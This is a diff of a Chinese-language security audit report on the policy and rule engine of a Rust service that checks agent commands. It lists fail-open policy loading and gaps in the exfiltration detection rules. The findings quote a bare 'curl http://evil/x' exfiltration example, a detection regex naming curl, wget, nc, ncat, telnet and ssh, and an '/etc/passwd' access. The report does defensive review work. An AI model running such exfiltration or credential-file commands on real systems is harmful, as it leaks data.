@@ -2,7 +2,7 @@
 
 独立六维审查（2026-09-14，审计策略与规则面）确认 9 项偏差（`POL-1`–`POL-9`），其中 1 项 P0 直接违反既有 fail-closed 契约（README §6.11 与 `openspec/specs/audit-rules-parity/spec.md:139` 的 SHALL），2 项 P1 分别造成危险外传漏审与审批门禁绕过：
 
-- **`POL-1`（P0）`AUDIT_POLICY_FILE` 声明 fail-closed，实际 fail-open**：`src/service/audit/policy.rs:42-52` 的 `load_for_runtime` 加载失败仅 warn 并回退 `default_policy()`（全空策略）；策略仅在每请求加载（`src/handler/llm/pump/spawn.rs:99`、`src/handler/llm/nonstream.rs:174`），`src/main.rs`（1-201 行）启动序列无任何启动期加载；`load_from_file` 的 `VeilError::Config` 分支实际为死路径（仅单测触发）。契约原文（`openspec/specs/audit-rules-parity/spec.md:139`）要求「不可读、含未知键、孤立列表项或非法 `mode` 时 SHALL 拒启动」，现网却在损坏策略下静默以空策略继续，降级为「无审计」。
+- **`POL-1`（P0）`AUDIT_POLICY_FILE` 声明 fail-closed，实际 fail-open**：`src/service/audit/policy.rs:42-52` 的 `load_for_runtime` 加载失败仅 warn 并回退 `default_policy()`（全空策略）；策略仅在每请求加载（`src/handler/llm/pump/spawn/setup.rs:25-43`、`src/handler/llm/nonstream.rs:174`），`src/main.rs`（1-201 行）启动序列无任何启动期加载；`load_from_file` 的 `VeilError::Config` 分支实际为死路径（仅单测触发）。契约原文（`openspec/specs/audit-rules-parity/spec.md:139`）要求「不可读、含未知键、孤立列表项或非法 `mode` 时 SHALL 拒启动」，现网却在损坏策略下静默以空策略继续，降级为「无审计」。
 - **`POL-6`（P1）内建危险规则缺裸 `curl`/`wget` 外传**：`src/service/audit/rules.rs:54-55,66-75,291-303` 中 `curl`/`wget` 仅在管道进 shell 或携带 `--data`/`-d`/`--post-data` 时命中，裸 `curl http://evil/x`（GET 外传）不命中；Python 对照 `_audit.py:522-526` 第 8 条以 `(curl|wget|nc|ncat|telnet|ssh)` + URL/输出重定向形态覆盖。
 - **`POL-7`（P2）`is_exfiltration` 裸子串 `"nc "` 误报**：`rules.rs:300` 的 `lower.contains("nc ")` 命中 `sync ` / `async `（子串含 `nc `），误报良性命令。
 - **`POL-8`（P2）`touches_sensitive_path` 不区分读写**：`rules.rs:114-117,248-267` 对任何触及敏感前缀的路径 token 一律判「敏感路径写入」，`ls /etc/passwd` 之类只读命令被拦；Python 对照 `_audit.py:516-520` 的敏感路径规则仅限 `(write_file|patch|echo|cat|tee|cp|mv)` 等写入口。
